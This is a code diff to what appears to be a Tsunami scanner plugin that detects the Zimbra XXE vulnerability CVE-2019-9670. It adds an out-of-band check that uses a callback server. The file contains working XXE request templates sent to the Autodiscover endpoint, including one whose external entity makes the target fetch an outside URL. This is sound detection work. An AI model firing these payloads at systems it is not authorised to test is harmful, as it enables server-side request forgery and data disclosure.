@@ -21,6 +21,7 @@ import static com.google.common.collect.ImmutableList.toImmutableList;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
@@ -32,16 +33,20 @@ import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
+import com.google.tsunami.plugin.payload.Payload;
+import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList;
 import com.google.tsunami.proto.DetectionStatus;
 import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
 import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 import java.util.UUID;
 import javax.inject.Inject;
@@ -92,6 +97,8 @@ public final class Cve20199670Detector implements VulnDetector {
   @VisibleForTesting
   static final String ZIMBRA_FINGERPRING = "Zimbra Collaboration Suite Web Client";
 
+  // When a callback server is not available, the payload inserted in this template will be
+  // reflected by the vulnerable instance.
   private static final String PAYLOAD_TEMPLATE_REFLECTED =
       "<?xml version=\"1.0\" ?>\n"
           + "<!DOCTYPE foo [<!ENTITY xxe \"%s\"> ]>\n"
@@ -100,15 +107,26 @@ public final class Cve20199670Detector implements VulnDetector {
           + "<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n"
           + "</Request>";
 
+  private static final String PAYLOAD_TEMPLATE_OOB =
+      "<?xml version=\"1.0\" ?>\n"
+          + "<!DOCTYPE foo [<!ENTITY oob SYSTEM \"%s\"> ]>\n"
+          + "<Request>\n"
+          + "<EMailAddress>email</EMailAddress>\n"
+          + "<AcceptableResponseSchema>&oob;</AcceptableResponseSchema>\n"
+          + "</Request>";
+
   private static final String AUTODISCOVER_PATH = "Autodiscover/Autodiscover.xml";
 
   private final Clock utcClock;
   private final HttpClient httpClient;
+  private final PayloadGenerator payloadGenerator;
 
   @Inject
-  Cve20199670Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  Cve20199670Detector(
+      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
+    this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
   @Override
@@ -156,16 +174,62 @@ public final class Cve20199670Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
+    if (payloadGenerator.isCallbackServerEnabled()) {
+      return testWithCallbackServer(networkService);
+    } else {
+      return testWithoutCallbackServer(networkService);
+    }
+  }
+
+  private boolean testWithCallbackServer(NetworkService networkService) {
     boolean isVulnerable = false;
 
+    if (!payloadGenerator.isCallbackServerEnabled()) {
+      // Callback server is required
+      return false;
+    }
+
+    PayloadGeneratorConfig config =
+        PayloadGeneratorConfig.newBuilder()
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
+            .setInterpretationEnvironment(
+                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
+            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
+            .build();
+    Payload payload = payloadGenerator.generate(config);
+    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
+      // Callback server is required
+      return false;
+    }
+
+    // Construct the payload with URL that points to callback server
+    String oobCallbackUrl = payload.getPayload();
+    String oobPayload = String.format(PAYLOAD_TEMPLATE_OOB, oobCallbackUrl);
     String targetUri =
         NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + AUTODISCOVER_PATH;
+    HttpRequest request = prepareRequest(targetUri, oobPayload);
+
+    try {
+      HttpResponse response = httpClient.send(request, networkService);
+      logger.atInfo().log("Waiting for XXE callback.");
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
+      isVulnerable = payload.checkIfExecuted();
+    } catch (IOException e) {
+      logger.atWarning().withCause(e).log("Request to target '%s' failed", targetUri);
+      return false;
+    }
+
+    return isVulnerable;
+  }
+
+  private boolean testWithoutCallbackServer(NetworkService networkService) {
+    boolean isVulnerable = false;
+
     String reflectedPayload = String.format(PAYLOAD_TEMPLATE_REFLECTED, TEST_STRING);
-    HttpRequest request =
-        HttpRequest.post(targetUri)
-            .setHeaders(HttpHeaders.builder().addHeader("Content-Type", "application/xml").build())
-            .setRequestBody(ByteString.copyFromUtf8(reflectedPayload))
-            .build();
+    String targetUri =
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + AUTODISCOVER_PATH;
+    HttpRequest request = prepareRequest(targetUri, reflectedPayload);
+
     try {
       HttpResponse response = httpClient.send(request, networkService);
       isVulnerable =
@@ -181,6 +245,13 @@ public final class Cve20199670Detector implements VulnDetector {
     }
 
     return isVulnerable;
+  }
+
+  private HttpRequest prepareRequest(String targetUri, String payload) {
+    return HttpRequest.post(targetUri)
+        .setHeaders(HttpHeaders.builder().addHeader("Content-Type", "application/xml").build())
+        .setRequestBody(ByteString.copyFromUtf8(payload))
+        .build();
   }
 
   private DetectionReport buildDetectionReport(
